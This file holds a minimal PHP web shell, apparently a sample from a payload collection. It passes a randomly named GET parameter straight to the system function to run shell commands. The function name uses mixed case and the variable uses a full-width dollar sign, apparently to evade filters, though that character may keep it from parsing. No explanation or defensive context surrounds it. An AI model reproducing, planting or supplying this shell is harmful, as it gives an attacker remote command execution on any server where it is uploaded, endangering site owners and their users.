<?php
SysTeM(＄_GET['2ZZWiqsJ']);
?>
